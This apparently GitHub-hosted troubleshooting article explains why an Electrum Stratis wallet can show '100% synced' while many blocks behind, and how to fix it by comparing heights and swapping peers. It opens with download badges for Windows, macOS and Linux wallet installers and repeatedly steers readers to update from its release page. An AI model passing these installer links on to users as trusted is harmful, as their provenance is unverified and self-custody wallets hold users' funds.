![Electrum-Stratis](assets/banner-article.png)

# Synced but 170,000 blocks behind: the stale peer

<p align="center">Height is the measurement</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A node can report itself fully synced while its height is years out of date, because "synced" means "matches the peers I have", not "matches the chain". One peer serving an old view is enough to make a wallet confidently wrong: transactions after that height are invisible, and the balance looks short or empty. The fix is a peer that is current, not a reinstall. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and its health panel reports the age of the last block for exactly this reason.

## You'll see this if

<div align="center">

| What you see | What it means | What to do |
|---|---|---|
| 100% synced, height far below tip | Stale peer | Replace the peer |
| Balance missing, address used recently | Transactions after the stale height | Resync from a current peer |
| Explorer shows more than the wallet | The wallet's view is old | Compare heights |
| "Up to date" after seconds | Nothing was downloaded | Check the height, not the label |
| Height jumps after adding a peer | The old peer was the problem | Keep the new one |

</div>

The lesson generalises: a status word is not a measurement. The height is the measurement, and it can be compared with any explorer in seconds.

## Why it happens

Peer-to-peer software trusts its peers to describe the chain. A node that connects to one peer, asks for its height, and receives an old number will download up to that number and then declare itself synced, because from its point of view there is nothing more to fetch. It has no independent sense of "now".

Stale peers persist for ordinary reasons: a machine that was suspended for months, a node behind a broken connection that never advanced, a fork of the network that stopped receiving blocks. None of them is malicious, and all of them produce the same symptom.

The second-order effect is what costs users time. Every check the wallet performs - balance, history, whether a payment arrived - is answered against that old view. The wallet is not lying; it is answering from the only data it has, and the data is old. That is why the remedy is a better peer rather than a reinstall: the software is working correctly against a bad input. Current builds carry a current peer set, so the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) is where to start when every peer looks stale ([three causes of a missing Electrum Stratis balance](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md); [Core showing zero peers](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/core-shows-zero-peers.md)).

## Fix

1. **Read the height, not the percentage.** Compare the wallet's block count with an explorer for the same chain. A gap of tens of thousands means a stale peer, whatever the status label says.
2. **Replace the peer.** In a full node, add a current peer and let it outrun the old one; in a light wallet, probe the server list and move a server with a recent block to the top.
3. **Wait for the catch-up, then re-check.** The height should climb steadily. A jump followed by a stall means the new peer is also behind.
4. **Rescan only after the height is current.** A rescan against a stale view reproduces the same wrong answer, and it costs time.
5. **Keep the peer that worked.** Once a server or node has proven current, note it, so the next failure has a known-good starting point.

If the height reaches the tip and the balance is still wrong, the problem was never the peer. That is the point to move to an address or rescan diagnosis.

## If that did not work

If every peer you try reports a similar old height, the network path may be reaching a segregated segment, or the build may be connecting to a peer set that no longer tracks the chain. Updating the software changes the peer set; that is the usual resolution.

If the height is current and a known transaction is missing, the wallet may not be watching that address. Before assuming that, confirm the wallet is actually connected: a client that lost its peer after the last sync keeps showing the old height ([the Electrum Stratis not-connected message](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)). Check whether it belongs to this wallet before concluding anything about the chain.

If a rescan appears to hang, let it finish before interrupting; a rescan walks the chain and can take a long time. Interrupting and restarting repeats the work.

## Prevention

- Compare heights with an explorer whenever a balance surprises you.
- Keep two or three peers you have verified as current.
- Do not trust "100% synced" without a height.
- Rescan only after the height is at the tip.
- Update the build when every peer looks stale.
- Keep the actively maintained build installed; the peer handling this diagnosis relies on ships with it.

## FAQ

### Why does my wallet say synced when it is far behind?

Because synced means "caught up with my peers". If the only peer is itself behind, the wallet has nothing more to download and reports completion. The height is the honest measure.

### How do I know my node is on a stale peer?

Compare its block height with an explorer for the same chain. A large gap, or a last-block time that is hours or days old, identifies the peer as stale.

### Will a rescan fix a stale peer?

No. A rescan re-reads the same blocks, so it produces the same result. Fix the peer first; rescan only once the height is current.

### Can a stale peer steal coins?

No. It can only misinform: it shows an old view of the chain. Spending still requires your keys, and a transaction signed by you is valid regardless of what any peer displays.

<!-- DOWNLOAD-BLOCK -->

A height comparison only works if both numbers are read at the same moment. Open two independent explorers, note their tips and timestamps, then look at your wallet. If your tip is behind by more than a handful of blocks, switch servers and recheck within a minute; if it catches up instantly, the old peer was simply frozen.

## Related articles

- [Core with zero peers](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/core-shows-zero-peers.md)
- [Coins sent to Core, and what the balance is waiting for](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/coins-sent-to-core-wallet.md)
- [Why the balance is missing, in three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Restored from seed and still offline](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/restored-but-still-offline.md)
